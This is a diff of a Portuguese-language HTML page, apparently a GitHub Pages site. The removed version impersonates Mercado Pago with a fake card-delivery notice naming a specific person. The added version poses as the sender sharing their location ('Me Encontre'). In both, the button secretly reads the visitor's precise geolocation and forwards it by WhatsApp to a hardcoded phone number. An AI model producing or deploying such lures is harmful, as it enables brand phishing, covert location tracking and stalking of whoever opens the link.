@@ -3,133 +3,266 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Mercado Pago - Confirmação de Entrega</title>
+<title>Me Encontre</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
 
   body {
-    margin: 0;
-    font-family: 'Montserrat', sans-serif;
-    background: #009ee3;
+    font-family: 'Inter', -apple-system, sans-serif;
+    background: #0a0a0a;
+    min-height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    color: #333;
+    padding: 24px;
+    -webkit-font-smoothing: antialiased;
   }
 
-  .container {
-    background: #fff;
-    border-radius: 14px;
-    width: 90%;
-    max-width: 420px;
-    padding: 40px 30px 50px;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-    text-align: left;
+  .card {
+    background: #1a1a1a;
+    border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 24px;
+    width: 100%;
+    max-width: 400px;
+    padding: 36px 28px 32px;
+    color: #fff;
+    box-shadow: 
+      0 30px 60px -20px rgba(0,0,0,0.9),
+      inset 0 1px 0 rgba(255,255,255,0.05);
+    position: relative;
+    overflow: hidden;
   }
 
-  .logo {
-    width: 110px;
-    margin-bottom: 30px;
-    display: block;
-    margin-left: auto;
-    margin-right: auto;
+  /* brilho suave no topo do card */
+  .card::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 300px;
+    height: 300px;
+    background: radial-gradient(circle, rgba(0,166,80,0.15) 0%, transparent 70%);
+    pointer-events: none;
   }
 
-  h2 {
-    color: #4a4a4a;
-    font-weight: 600;
-    font-size: 24px;
-    margin-bottom: 20px;
+  /* pin do topo com "pulse" */
+  .pin-top {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 24px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .pin-top span {
+    font-size: 32px;
+    filter: drop-shadow(0 4px 12px rgba(255,80,80,0.5));
+    animation: float 3s ease-in-out infinite;
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-6px); }
+  }
+
+  h1 {
     text-align: center;
-  }
-
-  p {
-    font-size: 16px;
-    color: #4a4a4a;
-    line-height: 1.5;
-    margin-bottom: 40px;
-  }
-
-  strong {
-    color: #222;
-  }
-
-  .btn-confirmar {
-    background-color: #00a650;
-    border: none;
-    color: white;
-    font-size: 18px;
-    padding: 15px 50px;
-    border-radius: 30px;
-    cursor: pointer;
+    font-size: 15px;
     font-weight: 600;
-    transition: background-color 0.3s ease;
-    box-shadow: 0 5px 15px rgba(0,166,80,0.4);
-    display: block;
-    margin: 0 auto;
+    letter-spacing: 4px;
+    color: #00a650;
+    margin-bottom: 12px;
+    text-transform: uppercase;
+    position: relative;
+    z-index: 1;
   }
 
-  .btn-confirmar:hover {
-    background-color: #007b3e;
-    box-shadow: 0 7px 20px rgba(0,123,62,0.6);
+  .subtitle {
+    text-align: center;
+    font-size: 22px;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 28px;
+    letter-spacing: -0.5px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* caixa do mapa - moderna */
+  .map-box {
+    position: relative;
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 16px;
+    height: 180px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 24px;
+    gap: 10px;
+    background: 
+      linear-gradient(135deg, rgba(0,166,80,0.05) 0%, rgba(0,166,80,0.02) 100%),
+      repeating-linear-gradient(0deg, transparent, transparent 19px, rgba(255,255,255,0.03) 20px),
+      repeating-linear-gradient(90deg, transparent, transparent 19px, rgba(255,255,255,0.03) 20px);
+    overflow: hidden;
+    z-index: 1;
+  }
+
+  /* cantos do mapa */
+  .map-box::before,
+  .map-box::after {
+    content: '';
+    position: absolute;
+    width: 16px;
+    height: 16px;
+    border-color: #00a650;
+    border-style: solid;
+  }
+  .map-box::before {
+    top: 10px; left: 10px;
+    border-width: 2px 0 0 2px;
+    border-radius: 6px 0 0 0;
+  }
+  .map-box::after {
+    bottom: 10px; right: 10px;
+    border-width: 0 2px 2px 0;
+    border-radius: 0 0 6px 0;
+  }
+
+  .map-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: #b0b0b0;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .map-pin {
+    font-size: 28px;
+    filter: drop-shadow(0 4px 10px rgba(255,80,80,0.6));
+    animation: float 2.5s ease-in-out infinite;
+  }
+
+  /* botão de localização */
+  .location-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #fff;
+    padding: 16px 24px;
+    margin-bottom: 20px;
+    cursor: pointer;
+    background: linear-gradient(135deg, #00a650 0%, #008d43 100%);
+    border: none;
+    border-radius: 14px;
+    width: 100%;
+    font-family: inherit;
+    transition: all 0.25s ease;
+    box-shadow: 
+      0 8px 20px -6px rgba(0,166,80,0.5),
+      inset 0 1px 0 rgba(255,255,255,0.2);
+    position: relative;
+    z-index: 1;
+  }
+
+  .location-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 
+      0 12px 28px -6px rgba(0,166,80,0.7),
+      inset 0 1px 0 rgba(255,255,255,0.2);
+  }
+
+  .location-btn:active {
+    transform: translateY(0);
+  }
+
+  .updated {
+    text-align: center;
+    font-size: 12px;
+    color: #6b6b6b;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .updated::before {
+    content: '';
+    width: 6px;
+    height: 6px;
+    background: #00a650;
+    border-radius: 50%;
+    box-shadow: 0 0 8px #00a650;
+    animation: pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
   }
 
   @media (max-width: 400px) {
-    .container {
-      padding: 30px 20px 40px;
-    }
-    h2 {
-      font-size: 20px;
-    }
-    .btn-confirmar {
-      padding: 12px 35px;
-      font-size: 16px;
-    }
+    .card { padding: 28px 22px 26px; }
+    .subtitle { font-size: 20px; }
+    .map-box { height: 160px; }
   }
 </style>
-<script>
-  function enviarLocalizacao() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          const linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          const whatsapp = `https://wa.me/558193568037?text=Mercado Pago: ${linkMaps}`;
-          window.location.href = whatsapp;
-        },
-        function(error) {
-          alert("Erro ao obter localização. Permita o acesso à localização no navegador.");
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        }
-      );
-    } else {
-      alert("Seu navegador não suporta geolocalização.");
-    }
-  }
-</script>
 </head>
 <body>
-  <div class="container">
-    <img
-      class="logo"
-      src="https://http2.mlstatic.com/frontend-assets/ui-navigation/5.18.7/mercadopago/logo__small.png"
-      alt="Logo Mercado Pago"
-      loading="lazy"
-    />
-    <h2>Cartão enviado com sucesso</h2>
-    <p>
-      Olá <strong>Lucas Gabriel Moraes</strong>, seu cartão Mercado Pago foi emitido<br />
-      e será entregue no endereço informado:<br /><br />
-      <strong>Recife - Pernambuco</strong><br /><br />
-      Clique abaixo para confirmar o recebimento da notificação.
-    </p>
-    <button class="btn-confirmar" onclick="enviarLocalizacao()">Confirmar</button>
+
+  <div class="card">
+
+    <div class="pin-top"><span>📍</span></div>
+
+    <h1>Me Encontre</h1>
+
+    <p class="subtitle">Estou por aqui 👇</p>
+
+    <div class="map-box">
+      <div class="map-title">Mapa</div>
+      <div class="map-pin">📍</div>
+    </div>
+
+    <button class="location-btn" onclick="enviarLocalizacao()">
+      <span>📍</span>
+      <span>Ver minha localização</span>
+    </button>
+
+    <p class="updated">Atualizada há poucos segundos</p>
+
   </div>
+
+  <script>
+    function enviarLocalizacao() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const mensagem = encodeURIComponent(`Localização: ${linkMaps}`);
+            const whatsapp = `https://wa.me/558197921133?text=${mensagem}`;
+            window.location.href = whatsapp;
+          },
+          function(error) {
+            alert("Erro ao obter localização. Permita o acesso à localização no navegador.");
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } else {
+        alert("Seu navegador não suporta geolocalização.");
+      }
+    }
+  </script>
+
 </body>
-</html>https://everton-mrx.github.io/Minha-localiza-o/
+</html>
